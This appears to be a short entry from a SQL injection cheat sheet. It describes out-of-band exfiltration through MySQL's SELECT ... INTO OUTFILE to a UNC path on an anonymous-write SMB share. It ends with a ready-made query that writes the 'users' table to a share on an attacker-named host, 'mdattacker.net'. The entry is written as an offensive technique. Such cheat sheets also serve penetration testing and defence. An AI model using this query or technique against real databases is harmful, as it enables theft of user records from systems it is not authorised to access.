INTO OUTFILE (single quotes CAN'T be bypassed)

The SELECT ... INTO OUTFILE command can be used to direct the output from an arbitrary query into a file. The specified filename may contain a UNC path, enabling you to direct the output to a file on your own computer.To receive the file, you need to create an SMB share on your computer that allows anonymous write access.

Retrieve file content via SMB
select * into outfile '\\\\mdattacker.net\\share\\output.txt' from users
